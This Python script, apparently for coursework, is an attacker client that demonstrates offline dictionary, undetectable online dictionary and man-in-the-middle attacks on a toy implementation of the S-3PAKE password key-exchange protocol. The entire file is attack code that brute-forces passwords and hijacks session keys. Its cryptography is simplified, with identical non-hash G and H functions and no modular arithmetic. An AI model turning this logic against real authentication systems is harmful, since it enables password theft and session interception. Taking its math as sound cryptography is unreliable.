from twisted.internet import reactor, protocol
from random import seed, randint
from struct import pack, unpack
from optparse import OptionParser
import re
import xml.etree.ElementTree as xml
from math import log
from time import sleep

settings = {
    'port':     None,
    'extport':  None,
    'pw':       None,
    'id':       None,
    'q':        None,
    'g':        None,
    'M':        None,
    'N':        None,
    'aid':      None,
    'bid':      None,
    'bip':      None,
    'bport':    None,
    'sid':      None,
    'sip':      None,
    'sport':    None
}

def G(values: tuple):
    return settings['g'] ** ((values[0] + values[1] + values[2]) % settings['q'])


def H(values: tuple):
    return settings['g'] ** ((values[0] + values[1] + values[2]) % settings['q'])


#Offline Dictionary attack

class OFFDA(protocol.Protocol):
    def __init__(self):
        seed()
        self.x = randint(1, settings['q'] - 1)
        self.y = randint(1, settings['q'] - 1)

    def connectionMade(self):
        self.transport.write(self.sendClientRequest())

    def dataReceived(self, data):
        K, S_Y = self.receiveServerResponse(data)

        self.guessPasswordA(K, S_Y)

        self.transport.loseConnection()

    def sendClientRequest(self):              
        print("[*]: Выбираются случайные x = {0:d} и y = {1:d} из Zp".format(self.x, self.y))
        
        X = settings['M'] ** self.x
        Y = settings['M'] ** self.y * settings['N'] ** settings['pw']

        print("[*]: Специальным образом вычисляются X и Y")

        print("[*]: \tX = M^x = {0:d}".format(X))
        print("[*]: \tY = M^y * N^pw = {0:d}".format(Y))

        print("[*I→S*]: A||X||I||Y")

        return pack('hxq', settings['aid'], X) + pack('hxq', settings['id'], Y)

    def receiveServerResponse(self, response):
        S_X, S_Y = unpack('qxq', response)
        print("[*I←S*]: S_X||S_Y")
        print("[*]: \tS_X = {0:d}".format(S_X))
        print("[*]: \tS_Y = {0:d}".format(S_Y))

        print("[*]: Имеются все необходимые данные для перебора пароля")

        K = int((int(S_X / (G((settings['id'], settings['sid'], settings['M'] ** self.y)) ** settings['pw']))) ** self.y)
        print("[*]: Вычисляется K = {0:d}".format(K))

        return K, S_Y

    def guessPasswordA(self, K, S_Y):
        pwA = 1

        while (True):                
            cK = int((int(S_Y / (G((settings['aid'], settings['sid'], settings['M'] ** (self.x - pwA))) ** pwA))) ** (self.x - pwA))

            print("\n----------------------------------------\n")

            print("[*]: Вычисляется K\' = {0:d}".format(cK))
            print("[*]: Предполагаемое значение пароля пользователя (id: {0:d}) = {1:d}".format(settings['aid'], pwA))

            if K == cK:
                break
            else:
                pwA += 1

        print("\n----------------------------------------\n")
        print("[$Выполнено$]: pw = {0:d}".format(pwA))

        reactor.stop()

#Undetectable Online Dictionary attack

class UONDAlistener(protocol.Protocol):
    def __init__(self):
        seed()
        #self.y = randint(1, settings['q'] - 1)   
        self.y = 2     
        self.pwGuess = 0
        self.g_x = None
        self.initId = None
        self.initX = None

        self.buffer = None
        self.proxyToServerProtocol = None

        self.initialReceive = False
        self.betaReceive = False

    def connectionMade(self):
        proxyToServerFactory = protocol.ClientFactory()
        proxyToServerFactory.protocol = UONDAproxy
        proxyToServerFactory.server = self

        reactor.connectTCP(settings['sip'], settings['sport'], proxyToServerFactory)

    def dataReceived(self, data):        
        if not self.initialReceive:
            messForA, self.initId, self.initX = self.receiveConnectRequest(data)

            message = self.tryPassword(self.pwGuess)
            
            if self.proxyToServerProtocol:
                self.proxyToServerProtocol.write(message)
            else:
                self.buffer = message

            self.initialReceive = True

            self.writeToClient(messForA)

    def writeToClient(self, data):
        self.transport.write(data)

    def receiveConnectRequest(self, message):
        print("[*A→I S*]: A||X\n")

        A, X = unpack('hxq', message)

        print("[*]: \tA = {0:d}".format(A))
        print("[*]: \tX = {0:d}".format(X))

        print("[*]: Выбирается случайное y = {0:d} из Zp".format(self.y))       

        random_S_Y = randint(1, 100000)
        random_alpha = randint(1, 100000)

        print("[*]: Сразу инициатору отправляется завершающее сообщение со случайными параметрами")
        print("[*]: \tS_Y = {0:d}".format(random_S_Y))
        print("[*]: \talpha = {0:d}".format(random_alpha))

        print("\n[*A←I S*]: S_Y||alpha")

        return pack('qxq', random_S_Y, random_alpha), A, X

    def tryPassword(self, pw):
        print("\n----------------------------------------\n")

        print("[*]: Предполагаемое значение пароля пользователя (id: {0:d}) = {1:d}".format(self.initId, pw))

        g_power_g_x = int(self.initX / settings['M'] ** pw)
        self.g_x = int(log(g_power_g_x, settings['g']))

        print("[*]: Вычисляется g^x = {0:d}".format(self.g_x))

        Y = (g_power_g_x ** self.y) * settings['N'] ** settings['pw']
        print("[*]: Вычисляется Y = {0:d}".format(Y))

        message = pack('hxq', self.initId, self.initX) + pack('hxq', settings['id'], Y)

        print("\n[*A I→S*]: A||X||I||Y")

        return message


class UONDAproxy(protocol.Protocol):
    def connectionMade(self):
        self.factory.server.proxyToServerProtocol = self
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''

        self.serverResponseReceive = False

    def dataReceived(self, data):
        if not self.passwordGuessResult(data):
            self.factory.server.pwGuess += 1
            message = self.factory.server.tryPassword(self.factory.server.pwGuess)
            self.write(message)
        else:
            print("\n----------------------------------------\n")
            print("[$Выполнено$] Значение pw для пользователя (id: {0:d}) = {1:d}".format(self.factory.server.initId, self.factory.server.pwGuess))
            
            reactor.stop()

    def write(self, data):
        if data:
            self.transport.write(data)

    def passwordGuessResult(self, response):
        print("[*A I←S*]: S_X||S_Y\n")

        S_X, S_Y = unpack('qxq', response)
        print("[*]: \tS_X = {0:d}".format(S_X))
        print("[*]: \tS_Y = {0:d}".format(S_Y))

        print("[*]: Проверка предположения о значении пароля")

        g_power_xz = int(S_X / G((settings['id'], settings['sid'], settings['g'] ** (self.factory.server.g_x * self.factory.server.y))) ** settings['pw'])
        print("[*]: Вычисляется g^(xz) = {0:d}".format(g_power_xz))

        g_power_xz_power_y = g_power_xz ** self.factory.server.y

        print("[*]: Вычисляется (g^(xz))^y = {0:d}".format(g_power_xz_power_y))

        g_power_xzy = int(S_Y / G((self.factory.server.initId, settings['sid'], settings['g'] ** self.factory.server.g_x)) ** self.factory.server.pwGuess)
        print("[*]: Вычисляется g^(x\'zy) = {0:d}".format(g_power_xzy))

        print("[*]: Сравнение вычисленных величин")

        if (g_power_xz ** self.factory.server.y == g_power_xzy):
            print("[*]: (g^(xz))^y = g^(x\'zy)")
            print("[*]: Предположение верно")
            return True

        print("[*]: (g^(xz))^y != g^(x\'zy)")
        print("[*]: Предположение не верно")

        return False


#MITM

class MITMlistener(protocol.Protocol):
    def __init__(self):
        seed()
        self.v = randint(1, settings['q'] - 1)        
        self.g_power_xz = None
        self.SK1 = None

        self.clientConnected = False
        self.connectionToTS = None
        self.forWaitBuffer = ''

        MITMlproxyFactory = protocol.ClientFactory()
        MITMlproxyFactory.protocol = MITMlproxy
        MITMlproxyFactory.main = self

        reactor.connectTCP(settings['sip'], settings['sport'], MITMlproxyFactory)

    def dataReceived(self, data):
        if not self.clientConnected:            
            V = settings['g'] ** self.v * settings['N'] ** settings['pw']
            print("Сеанс №1 [*A→I(B) B I S*]: A||X\n")
            
            print("Сеанс №1 [*]: Выбирается случайное v = {0:d} из Zp".format(self.v))
            print("Сеанс №1 [*]: Вычисляется V = {0:d}\n".format(V))            

            print("Сеанс №1 [*A I B I→S*]: A||X||I||V")

            if self.connectionToTS is not None:
                self.connectionToTS.write(data + pack('hxq', settings['id'], V))
            else:
                self.forWaitBuffer = data + pack('hxq', settings['id'], V)

            self.clientConnected = True
        else:
            beta = unpack('q', data)[0]
            print("Сеанс №1 [*]: Значение alpha прошло проверку у клиента A")            
            print("\nСеанс №1 [*A→I(B) B I S*]: beta\n")
            print("Сеанс №1 [*]: beta = {0:d}".format(beta))
            print("Сеанс №1 [*]: Вычисление beta\' и сравнение его с beta")

            test_beta = int(G((settings['bid'], settings['aid'], self.g_power_xz ** self.v)))

            print("Сеанс №1 [*]: beta\' = {0:d}".format(test_beta))

            if beta == test_beta:
                print("Сеанс №1 [*]: beta\' = beta\n")
                self.SK1 = H((settings['aid'], settings['bid'], self.g_power_xz ** self.v))

                MITMinitiatorFactory = protocol.ClientFactory()
                MITMinitiatorFactory.protocol = MITMinitiator
                MITMinitiatorFactory.main = self

                reactor.connectTCP(settings['bip'], settings['bport'], MITMinitiatorFactory)
            else:
               print("Сеанс №1 [*]: beta\' != beta")
               print("Сеанс №1 Ошибка [!]: Полученное значение не верно")

    def write(self, data):
        self.transport.write(data)


class MITMlproxy(protocol.Protocol):
    def connectionMade(self):
        self.factory.main.connectionToTS = self

        if self.factory.main.forWaitBuffer != '':
            self.write(self.factory.main.forWaitBuffer)
            self.factory.main.forWaitBuffer = ''

    def dataReceived(self, data):
        S_X, S_V = unpack('qxq', data)
        print("Сеанс №1 [*A I B I←S*]: S_X||S_V\n")

        print("Сеанс №1 [*]: \tS_X = {0:d}".format(S_X))
        print("Сеанс №1 [*]: \tS_V = {0:d}".format(S_V))
        self.factory.main.g_power_xz = int(S_X / G((settings['id'], settings['sid'], settings['g'] ** self.factory.main.v)) ** settings['pw'])
        print("Сеанс №1 [*]: Вычисляется g^(xz) = {0:d}".format(self.factory.main.g_power_xz))
        alpha = int(G((settings['aid'], settings['bid'], self.factory.main.g_power_xz ** self.factory.main.v)))
        print("Сеанс №1 [*]: Вычисляется alpha = {0:d}".format(alpha))

        print("\nСеанс №1 [*A←I(B) B I S*]: S_V||alpha\n")
     
        self.factory.main.write(pack('qxq', S_V, alpha))

    def write(self, data):
        self.transport.write(data)


class MITMinitiator(protocol.Protocol):
    def __init__(self):
        seed()
        self.w = randint(1, settings['q'] - 1)

    def connectionMade(self):
        W = settings['g'] ** self.w * settings['M'] ** settings['pw']
        print("Сеанс №2 [*]: Выбирается случайное w = {0:d} из Zp".format(self.w))
        print("Сеанс №2 [*]: Вычисляется W = {0:d}\n".format(W))

        print("Сеанс №2 [*A I(A)→B I S*]: A||W")

        self.write(pack('hxq', settings['aid'], W))

    def dataReceived(self, data):
        S_W, alpha = unpack('qxq', data)
        print("Сеанс №2 [*A I(A)←B I S*]: S_W||alpha\n")
        print("Сеанс №2 [*]: \tS_W = {0:d}".format(S_W))
        print("Сеанс №2 [*]: \talpha = {0:d}".format(alpha))

        g_power_yz = int(S_W / (G((settings['id'], settings['sid'], settings['g'] ** self.w)) ** settings['pw']))
        print("Сеанс №2 [*]: Вычисляется g^(yz) = {0:d}".format(g_power_yz))

        test_alpha = int(G((settings['aid'], settings['bid'], g_power_yz ** self.w)))

        print("Сеанс №2 [*]: Проверяется полученное значение alpha")
        print("Сеанс №2 [*]: Вычисляется alpha\' = {0:d}".format(test_alpha))

        if alpha == test_alpha:
            print("Сеанс №2 [*]: alpha\' = alpha")            
            print("Сеанс №2 [*]: Полученное значение верно")

            SK2 = H((settings['aid'], settings['bid'], g_power_yz ** self.w))

            beta = int(G((settings['bid'], settings['aid'], g_power_yz ** self.w)))
            print("Сеанс №2 [*]: Вычисляется beta = {0:d}".format(beta))
            print("\nСеанс №2 [*A I(A)→B I S*]: beta\n")

            self.write(pack('q', beta))

            print("[*]: Атака завершена успешно")
            print("[*]: Получены все сеансовые ключи")
            print("[*A <--> I(B)*]: SK = ", self.factory.main.SK1)
            print("[*I(A) <--> B*]: SK = ", SK2)
        else:
            print("Сеанс №2 [*]: alpha\' != alpha")
            print("Сеанс №2 [*]: Полученное значение не верно")
            print("Сеанс №2 [*]: Завершение сеанса")

    def write(self, data):
        self.transport.write(data)


class MITMserver(protocol.Protocol):
    def __init__(self):
        self.connectionToTS = None
        self.forWaitBuffer = ''

        MITMsproxyFactory = protocol.ClientFactory()
        MITMsproxyFactory.protocol = MITMsproxy
        MITMsproxyFactory.main = self

        reactor.connectTCP(settings['sip'], settings['sport'], MITMsproxyFactory)

    def dataReceived(self, data):
        A, W, B, Y = unpack('hxqhxq', data)

        if self.connectionToTS is not None:
            self.connectionToTS.write(pack('hxqhxq', settings['id'], W, B, Y))
        else:
            self.forWaitBuffer = pack('hxqhxq', settings['id'], W, B, Y)

        print("Сеанс №2 [*A I B→I(S) S*]: A||W||B||Y")
        print("\nСеанс №2 [*]: Заменяем сообщение A||W||B||Y на I||W||B||Y\n")
        print("Сеанс №2 [*A I B I(B)→S*]: I||W||B||Y")

    def write(self, data):
        print("Сеанс №2 [*A I B I(B)←S*]: W\'||Y\'")
        self.transport.write(data)
        print("Сеанс №2 [*A I B←I(S) S*]: W\'||Y\'")


class MITMsproxy(protocol.Protocol):
    def connectionMade(self):
        self.factory.main.connectionToTS = self

        if self.factory.main.forWaitBuffer != '':
            self.write(self.factory.main.forWaitBuffer)
            self.factory.main.forWaitBuffer = ''

    def dataReceived(self, data):
        self.factory.main.write(data)
        self.transport.loseConnection()

    def write(self, data):
        self.transport.write(data)


class ClientSettingsManager():
    def __init__(self):
        self.filename = 'intruder_settings.xml'

        try:
            open(self.filename, 'r')
        except IOError:
            self.createSettingsFile()      

    def checkOptionName(self, optionName, inNames: list):
        
        for name in inNames:
            if optionName == name:
                return True

        return False

    def createSettingsFile(self):
        root = xml.Element('settings')

        network = xml.Element('network')
        private = xml.Element('private')
        public = xml.Element('public')
        userA = xml.Element('userA')
        userB = xml.Element('userB')
        server = xml.Element('server')

        root.append(network)
        root.append(private)
        root.append(public)
        root.append(userA)
        root.append(userB)
        root.append(server)

        xml.SubElement(network, 'port')
        xml.SubElement(network, 'extport')

        xml.SubElement(private, 'pw')        

        xml.SubElement(public, 'id')
        xml.SubElement(public, 'q')
        xml.SubElement(public, 'g')
        xml.SubElement(public, 'M')
        xml.SubElement(public, 'N')

        xml.SubElement(userA, 'aid')

        xml.SubElement(userB, 'bid')
        xml.SubElement(userB, 'bip')
        xml.SubElement(userB, 'bport')

        xml.SubElement(server, 'sid')
        xml.SubElement(server, 'sip')
        xml.SubElement(server, 'sport')

        tree = xml.ElementTree(root)       
        
        try:
            tree.write(self.filename, xml_declaration=True)   
        except:
            print("Ошибка [!]: Ошибка создания файла настроек")

    def setSettings(self, inSettings: dict):
        global settings

        if type(inSettings) is not dict:
            print("Ошибка [!]: Передавать настройки можно только в словаре, передан: %s" % type(inSettings))
            return

        try:
            tree = xml.ElementTree(file=self.filename)
        except IOError:
            self.createSettingsFile()
            tree = xml.ElementTree(file=self.filename)

        root = tree.getroot()

        for settingsType in root:
            for option in settingsType:
                if self.checkOptionName(option.tag, inSettings.keys()):
                    option.text = str(inSettings.get(option.tag))

        tree = xml.ElementTree(root)
        try:
            tree.write(self.filename)
        except:
            print("Ошибка [!]: Ошибка добавления новых настроек")
    
    def getSettings(self):
        global settings

        try:
            clSettings = xml.ElementTree(file=self.filename)
        except IOError:
            self.createSettingsFile()
            clSettings = xml.ElementTree(file=self.filename)

        settingsXML = clSettings.getroot()

        for settingsType in settingsXML:
            for parametr in settingsType:
                settings[parametr.tag] = parametr.text

        settings = self.convertTypeSettings(settings)

    def checkSettingsFile(self):
        try:
            tree = xml.ElementTree(file=self.filename)
        except IOError:
            print("Ошибка [!]: Создайте файл перед проверкой корректности его формата")
            return
        
        root = tree.getroot()

        trueTypeNames = ['network', 'private', 'public', 'userA', 'userB', 'server']
        trueOptionNames = [
            ['port', 'extport'], 
            ['pw'], 
            ['id', 'q', 'g', 'M', 'N'],
            ['aid'],
            ['bid', 'bip', 'bport'],
            ['sid', 'sip', 'sport']]

        settingsType = enumerate(root)

        if len(root) != len(trueTypeNames):
            return False
        
        for i, typeName in settingsType:
            if typeName.tag != trueTypeNames[i]:
                return False

            if len(typeName) != len(trueOptionNames[i]):
                return False

            for j, optionName in enumerate(typeName):
                if optionName.tag != trueOptionNames[i][j]:
                    return False

        return True

    def isIpValid(self, ip):
        regexIpValidation = r'^((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))$'
    
        if re.search(regexIpValidation, ip) is None:            
            return False

        return True

    def generalCheckSettings(self, settings):
        result = True

        if settings['pw'] is None:
            print("Ошибка [!]: Необходимо указать pw")
            result = False
        if settings['q'] is None:
            print("Ошибка [!]: Необходимо указать q")
            result = False
        if settings['g'] is None:
            print("Ошибка [!]: Необходимо указать g")            
            result = False
        if settings['M'] is None:
            print("Ошибка [!]: Необходимо указать M")
            result = False
        if settings['N'] is None:
            print("Ошибка [!]: Необходимо указать N")
            result = False
        if settings['id'] is None:
            print("Ошибка [!]: Необходимо указать id")
            result = False
        if settings['sid'] is None:
            print("Ошибка [!]: Необходимо указать sid")
            result = False
        if settings['sip'] is None:
            print("Ошибка [!]: Необходимо указать sip")
            result = False
        elif not self.isIpValid(settings['sip']):
            print("Ошибка [!]: Некорректный формат адреса sip")
        if settings['sport'] is None:
            print("Ошибка [!]: Необходимо указать sport")
            result = False
        if settings['pw'] is None:
            print("Ошибка [!]: Необходимо указать pw")
            result = False

        return result

    def OFFDACheckSettings(self, settings):
        result = self.generalCheckSettings(settings)
        
        if settings['aid'] is None:
            print("Ошибка [!]: Необходимо указать aid")
            result = False
        if settings['bid'] is None:
            print("Ошибка [!]: Необходимо указать aid")
            result = False
        
        return result

    def UONDACheckSettings(self, settings):
        result = self.generalCheckSettings(settings)       
        
        if settings['port'] is None:
            print("Ошибка [!]: Необходимо указать port")
            result = False  

        return result

    def MITMCheckSettings(self, settings):
        result = self.generalCheckSettings(settings)

        if settings['port'] is None:
            print("Ошибка [!]: Необходимо указать port")
            result = False
        if settings['extport'] is None:
            print("Ошибка [!]: Необходимо указать extport")
            result = False
        if settings['aid'] is None:
            print("Ошибка [!]: Необходимо указать aid")
            result = False
        if settings['bid'] is None:
            print("Ошибка [!]: Необходимо указать bid")
            result = False
        if settings['bip'] is None:
            print("Ошибка [!]: Необходимо указать bip")
            result = False
        elif not self.isIpValid(settings['bip']):
            print("Ошибка [!]: Некорректный формат адреса bip")
            result = False
        if settings['bport'] is None:
            print("Ошибка [!]: Необходимо указать bport")

    def addSettings(self, options):
        settingsDict = {}

        for name in settings.keys():
            if options[name] is not None:
                settingsDict[name] = options[name]

        return settingsDict

    def convertTypeSettings(self, settings: dict):
        for key in settings.keys():
            if key.find('ip') == -1 and settings.get(key) is not None:
                settings[key] = int(settings.get(key))

        return settings


def printOptions(mitm=False, offda=False, uonda=False):
    print("[*]: Параметры клиента (секретные)")
    print("[*]: \tpw = {0:d}".format(settings['pw']))
    print("[*]: Параметры клиента (публичные)")
    print("[*]: \tid = {0:d}".format(settings['id']))
    print("[*]: \tq = {0:d}".format(settings['q']))
    print("[*]: \tg = {0:d}".format(settings['g']))
    print("[*]: \tM = {0:d}".format(settings['M']))
    print("[*]: \tN = {0:d}".format(settings['N']))
    print("[*]: Параметры сервера")
    print("[*]: \tid = {0:d}".format(settings['sid']))
    print("[*]: \tip = {0:s}".format(settings['sip']))
    print("[*]: \tport = {0:d}".format(settings['sport']))

    if mitm:
        print("[*]: Параметры клиента A")
        print("[*]: \tid = {0:d}".format(settings['aid']))
        print("[*]: Параметры клиента B")
        print("[*]: \tid = {0:d}".format(settings['bid']))
        print("[*]: \tip = {0:s}".format(settings['bip']))
        print("[*]: \tport = {0:d}".format(settings['bport']))
        print("[*]: Параметры сети")
        print("[*]: \tport = {0:d}".format(settings['port']))
        print("[*]: \textport = {0:d}".format(settings['extport']))   
    elif offda:
        print("[*]: Параметры атакуемого клиента")
        print("[*]: \tid = {0:d}".format(settings['aid']))
    elif uonda:        
        print("[*]: Параметры сети")
        print("[*]: \tport = {0:d}".format(settings['port']))


def main():
    optionParser = OptionParser(description='Клиент нарушителя, реализующий эксплуатацию уязвимостей протокола S-3PAKE.\nДоступные атаки: Offline Dictionary Attack, Undetectable Online Dictionary Attack, Man-In-The-Middle.')

    optionParser.add_option('-m', '--mitm', action='store_true', help='Выбор атаки: Man-In-The-Middle')
    optionParser.add_option('-o', '--offlineDict', action='store_true', help='Выбор атаки: Offline Dictionary Attack')
    optionParser.add_option('-u', '--undetectableOnlineDict', action='store_true', help='Выбор атаки: Undetectable Online Dictionary Attack')

    optionParser.add_option('-p', '--port', action='store', help='Установка значения порта, на котором нарушитель будет ожидать подключения')
    optionParser.add_option('-e', '--extport', action='store', help='Установка дополнительного значения порта, на котором нарушитель будет ожидать подключения')
    optionParser.add_option('-w', '--pw', action='store', help='Установка секретного значения пароля')
    optionParser.add_option('-i', '--id', action='store', help='Установка значения числового идентификатора нарушителя')
    optionParser.add_option('-q', '--q', action='store', help='Установка значения порядка группы')
    optionParser.add_option('-g', '--g', action='store', help='Установка значения порождающего элемента группы')
    optionParser.add_option('-M', '--M', action='store', help='Установка затемняющего значения M')
    optionParser.add_option('-N', '--N', action='store', help='Установка затемняющего значения N')
    optionParser.add_option('-a', '--aid', action='store', help='Установка значения числового идентификатора клиента-инициатора в отношении которого проводится атака')
    optionParser.add_option('-b', '--bid', action='store', help='Установка значения числового идентификатора клиента, ожидающего подключения инициатора, в отношении которого проводится атака')
    optionParser.add_option('--bip', action='store', help='Установка значения ip-адреса клиента, ожидающего подключения инициатора, в отношении которого проводится атака')
    optionParser.add_option('--bport', action='store', help='Установка значения порта клиента, ожидающего подключения инициатора, в отношении которого проводится атака')
    optionParser.add_option('-s', '--sid', action='store', help='Установка значения числового идентификатора доверенного сервера')
    optionParser.add_option('--sip', action='store', help='Установка значения ip-адреса доверенного сервера')
    optionParser.add_option('--sport', action='store', help='Установка значения порта доверенного сервера')

    (options, arguments) = optionParser.parse_args()

    csm = ClientSettingsManager()

    if not csm.checkSettingsFile():
        print("Ошибка [!]: Поврежден файл с настройками клиента")
        return

    settingsDict = csm.addSettings(options.__dict__)
    
    if settingsDict != {}:
        csm.setSettings(settingsDict)                

    csm.getSettings()

    if options.__dict__['mitm']:
        print("[*]: Демонстрация атаки MITM")

        printOptions(mitm=True)

        serverFactory = protocol.ServerFactory()
        serverFactory.protocol = MITMserver

        listenerFactory = protocol.ServerFactory()
        listenerFactory.protocol = MITMlistener
        
        try:
            reactor.listenTCP(settings['port'], listenerFactory)
        except:
            print("Ошибка [!]: Ошибка при инициализации порта {0:d}".format(settings['port']))
        try:
            reactor.listenTCP(settings['extport'], serverFactory)
        except:
            print("Ошибка [!]: Ошибка при инициализации порта {0:d}".format(settings['extport']))

        print("[*]: Инициализация завершена успешно\n")
        print("[*]: Ожидание подключений...\n")
    elif options.__dict__['offlineDict']:
        print("[*]: Демонстрация атаки Offline Dictionary Attack")

        printOptions(offda=True)

        initiatorFactory = protocol.ClientFactory()
        initiatorFactory.protocol = OFFDA

        try:
            reactor.connectTCP(settings['sip'], settings['sport'], initiatorFactory)
        except:
            print("Ошибка [!]: Ошибка при подключении по адресу {0:s}:{1:d}".format(settings['sip'], settings['sport']))

        print("[*]: Инициализация завершена успешно\n")
        print("[*]: Подключение...\n")
    elif options.__dict__['undetectableOnlineDict']:
        print("[*]: Демонстрация атаки Undetectable Online Dictionary Attack")

        printOptions(uonda=True)

        listnerFactory = protocol.ServerFactory()
        listnerFactory.protocol = UONDAlistener

        try:        
            reactor.listenTCP(settings['port'], listnerFactory)
        except:
            print("Ошибка [!]: Ошибка при инициализации порта {0:d}".format(settings['port']))

        print("[*]: Инициализация завершена успешно\n")
        print("[*]: Ожидание подключения...\n")
    
    reactor.run()


if __name__ == '__main__':
    main()